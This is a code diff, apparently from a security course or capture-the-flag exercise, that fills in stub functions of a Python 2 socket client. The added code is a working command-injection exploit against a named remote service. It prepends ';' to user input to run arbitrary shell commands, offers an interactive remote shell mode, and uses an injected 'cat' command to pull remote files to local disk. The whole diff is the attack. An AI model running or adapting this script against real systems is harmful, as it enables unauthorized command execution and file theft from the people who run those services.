@@ -8,30 +8,52 @@
 """
 
 import socket
+import os 
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
-
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-
-            Reading:
-
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
-
-
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    while (True): #iterate until quit keyword found
+        cmd= raw_input("")  
+        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,port))
+ 
+        if (cmd == 'shell'):
+            cmd= ";"
+            while (True):
+                s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((host,port))
+                cmd2 = raw_input("")
+                fullC= cmd + cmd2 + "\n;"
+
+                if 'cd' in cmd2:
+                    cmd+= cmd2 + ";" #keep track of directory changes
+                if ('exit' in cmd2):
+                    print("Exit interactive shell")
+                    break
+
+                s.send(fullC)
+                data= s.recv(4096) #disregard header data
+                data= s.recv(4096)
+                print(data)
+
+        elif ('pull' in cmd):
+            arr= cmd.split()
+            s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host,port))
+
+            s.send("; cat " + arr[1] + "\n")
+            data2= s.recv(4096)
+            data= s.recv(4096)
+            f= open(arr[2], 'w') #some issues navigating to home directory
+            f.write(data)
+            f.close()
+            print("Data pulled")
+
+        elif (cmd == 'help'):
+            print("1. shell Drop into an interactive shell and allow users to gracefully exit \n 2. pull <remote-path> <local-path> Download files \n 3. help Shows this help menu \n 4. quit Quit the shell")
+
+        elif (cmd ==  'quit' or cmd == 'q'):
+            print("Exiting program...")
+            break
